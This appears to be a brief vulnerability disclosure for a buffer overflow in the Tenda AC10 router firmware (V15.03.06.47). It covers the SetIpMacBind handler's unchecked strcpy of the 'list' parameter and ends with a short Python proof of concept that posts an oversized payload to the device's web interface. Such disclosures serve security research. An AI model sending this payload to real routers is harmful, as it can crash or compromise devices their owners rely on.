# buffer overflow

## Tenda_AC10

version: V15.03.06.47

## Description:

There is a buffer overflow in httpd/fromSetIpMacBind

## Source:

you may download it from : https://www.tendacn.com/download/detail-3796.html

## Analyse:


![](15.png)

get value from list ,and pass to list, if new_static_num between 0-33, call strcpy, cause buff overflow


## POC
```
url = "http://192.168.1.13/goform/SetIpMacBind"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'list': payload, 'bindnum': 1})
``` 
